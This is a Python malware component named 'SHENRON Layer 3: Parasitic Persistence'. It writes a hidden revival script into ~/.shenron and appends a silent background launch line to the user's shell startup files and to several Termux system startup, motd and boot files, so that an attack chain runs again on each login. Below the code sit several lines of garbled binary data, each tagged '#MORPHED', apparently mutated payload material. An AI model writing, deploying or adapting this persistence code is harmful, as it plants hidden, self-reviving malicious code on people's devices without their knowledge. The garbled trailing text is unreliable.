#!/usr/bin/env python3
# symbiote_payload.py - SHENRON Layer 3: Parasitic Persistence

import os
from pathlib import Path

INJECT_LINE = 'python3 ~/.shenron/.revive.py &>/dev/null &\n'

TARGETS = [
    "~/.bashrc",
    "~/.zshrc",
    "~/.profile",
    "/data/data/com.termux/files/usr/etc/bash.bashrc",
    "/data/data/com.termux/files/usr/etc/motd",
    "/data/data/com.termux/files/usr/etc/init.d/00symbiote",
    "/data/data/com.termux/files/usr/etc/termux/boot/startup.sh",
]

def ensure_revival_script():
    revive_path = Path("~/.shenron/.revive.py").expanduser()
    revive_path.parent.mkdir(parents=True, exist_ok=True)
    if not revive_path.exists():
        with open(revive_path, "w") as f:
            f.write("#! /usr/bin/env python3\nimport os\nos.system('~/.shenron/.start_chain.sh')\n")
        os.chmod(revive_path, 0o755)

def inject_into(target_file):
    try:
        full_path = Path(target_file).expanduser()
        full_path.parent.mkdir(parents=True, exist_ok=True)
        full_path.touch(exist_ok=True)

        with open(full_path, "r") as f:
            content = f.read()
            if INJECT_LINE.strip() in content:
                print(f"[~] Already injected: {full_path}")
                return

        with open(full_path, "a") as f:
            f.write(f"\n{INJECT_LINE}")
        print(f"[+] Injected into: {full_path}")
    except Exception as e:
        print(f"[!] Failed to inject into {target_file}: {e}")

def main():
    ensure_revival_script()
    for target in TARGETS:
        inject_into(target)

if __name__ == "__main__":
    main()

ˆşèÁátt~Bã6œWÀUï#MORPHED

At×«!0705ßNÿ´úà²&)…À×F•ÛM÷åfÿÚ¥ì|ìñk„?Et3÷Ã×Å#MORPHED

oÛsv¡¡¸	43ù˜RŒÈÎXakN„UoI²"mâ()Uë`ìäz*sc#MORPHED

Ôs~ü¶2?ÄŸR!X¬òÒš½X³Àn’^XT‚µbØ˜Àò! ¹#MORPHED
